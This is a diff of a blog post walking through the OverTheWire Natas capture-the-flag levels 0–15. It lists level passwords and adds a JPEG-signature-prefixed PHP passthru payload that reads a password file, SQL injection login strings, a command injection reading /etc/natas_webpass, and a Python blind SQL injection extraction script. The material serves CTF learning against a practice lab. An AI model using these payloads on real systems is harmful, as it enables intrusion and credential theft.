@@ -130,31 +130,31 @@
 
 <p>I spent last day an hour or something on natas , the website would be very familiar to you. It was the website from which I first started to learn linux commands and the same people who run banditoverwire. Actually came to know from wechall.net, well that was also new to me :) But I could assure you that if you want to start with web exploitation as a CTF point of you, this is http://natas.natas.labs.overthewire.org very good option.</p>
 
-<p>Challenge 00</p>
+<p>Natas 00</p>
 
 <p>See the source code.</p>
 
 <blockquote>pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto</blockquote>
 
-<p>Challenge 01</p>
+<p>Natas 01</p>
 
 <p>Go to developer option by clicking F12</p>
 
 <blockquote>pass:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</blockquote>
 
-<p>Challenge 02</p>
+<p>Natas 02</p>
 
 <p>Goto files directory</p>
 
 <blockquote>pass:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</blockquote>
 
-<p>Challenge 03</p>
+<p>Natas 03</p>
 
 <p>Open the robots.txt you will get the file which contain pass to next level.</p>
 
 <blockquote>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</blockquote>
 
-<p>Challenge 04</p>
+<p>Natas 04</p>
 
 <p>Use a burp suite and change the referrer</p>
 
@@ -162,13 +162,13 @@
             pass:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
 </blockquote>
 
-<p>Challenge 05</p>
+<p>Natas 05</p>
 
 <p>You have to change the cookie of login from 0 to 1, using edit my cookie or firebug</p>
 
 <blockquote>pass:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</blockquote>
 
-<p>Challenge 06</p>
+<p>Natas 06</p>
 
 <p> You can easily get the secret using the page source, when you get the secret.
 Give a post request using secret and a submit. Write a script or use postman in chrome.
@@ -176,13 +176,13 @@ Give a post request using secret and a submit. Write a script or use postman in 
 
 <blockquote>pass:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</blockquote>
 
-<p>Challenge 07</p>
+<p>Natas 07</p>
 
 <p>Remote file inclusion</p>
 
 <blockquote>pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</blockquote>
 
-<p>Challenge 08</p>
+<p>Natas 08</p>
 
 <p>Exploit</p>
 
@@ -190,7 +190,7 @@ Give a post request using secret and a submit. Write a script or use postman in 
 
 <blockquote>pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</blockquote>
 
-<p>Challenge 09</p>
+<p>Natas 09</p>
 
 <p>Exploit</p>
 
@@ -198,7 +198,7 @@ Give a post request using secret and a submit. Write a script or use postman in 
 
 <blockquote>Pass:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</blockquote>
 
-<p>Challenge 10</p>
+<p>Natas 10</p>
 
 <p>There are exactly 2 ways to solve the challenge, one is going back to challenge 9
 and entering ".* /etc/natas_webpass/natas11"</p>
@@ -209,7 +209,7 @@ and entering ".* /etc/natas_webpass/natas11"</p>
 
 <blockquote>pass:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</blockquote>
 
-<p>challenge 11</p>
+<p>Natas 11</p>
 
 <p>Getting the key</p>
 
@@ -262,6 +262,69 @@ and entering ".* /etc/natas_webpass/natas11"</p>
 
 <blockquote>pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</blockquote>
 
+<p>Natas 12</p>
+
+<p>Upload burp and change the request of the file name.</p>
+
+<p>pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</p>
+
+<p>Natas 13</p>
+
+<p>exif_imagetype() reads the first bytes of an image and checks its signature.when you view the file you can see the first 4 character as that. So its gona bypass the exif_imagetype() as its only gona verify that it matches with the signature of jpg.</p>
+
+<blockquote>\xFF\xD8\xFF\xE8 <?php passthru('cat /etc/natas_webpass/natas14'); ?></blockquote>
+
+<p>pass : pass:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</p>
+
+<p>Natas 14</p>
+
+<p>username = " or "1"="1<br />
+password = " or "1"="1</p>
+
+<p>pass:pass:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</p>
+
+<p>Natas 15</p>
+
+<blockquote>
+#/usr/bin/python<br />
+__author__="hrj"<br />
+<br />
+import requests<br />
+import string<br />
+import re<br />
+<br />
+c = '1234567890' + string.ascii_lowercase  + string.ascii_uppercase<br />
+password = ''<br />
+<br />
+#To find the length of the database<br />
+print "------------------------------------------------------------------------"<br />
+print "                Have patience , we will bring you the result            "<br />
+print "------------------------------------------------------------------------"<br />
+'''<br />
+for i in range(1,50):<br />
+    r = requests.get(('http://natas15.natas.labs.overthewire.org?username=natas16" AND (length(password)) ="'+str(i)), auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))<br />
+    res = r.text<br />
+    #print res<br />
+    tmp = re.findall("exists",res)<br />
+    if tmp:<br />
+        print "Length: " + str(i)<br />
+        break<br />
+''' <br />
+#To find the password<br />
+for j in range(1,33):<br />
+    for k in range(20,123):<br />
+        r = requests.get(('http://natas15.natas.labs.overthewire.org?username=natas16" AND ascii(substr((password),'+str(j)+',1)) = "'+str(k)), auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))<br />
+        res = r.text<br />
+        #`print res<br />
+        tmp = re.findall("exists",res)<br />
+        if tmp:<br />
+            password+=chr(k)<br />
+            print "Guess Pass = " + password<br />
+            break<br />
+<br />
+print "Last Result : " + password<br />
+</blockquote>
+
 <p>Wait for the next blog, will be soon back!</p>
 
 <p>Thank you for reading the blog! </p>
@@ -277,6 +340,10 @@ and entering ".* /etc/natas_webpass/natas11"</p>
                         <a href="/2016/01/20/wehacking-kr/" data-toggle="tooltip" data-placement="top" title="Webhacking Kr">&larr; Previous Post</a>
                     </li>
                     
+                    
+                    <li class="next">
+                        <a href="/2016/01/29/simple-captcha-bypass/" data-toggle="tooltip" data-placement="top" title="Captcha Bypass">Next Post &rarr;</a>
+                    </li>
                     
                 </ul>
 
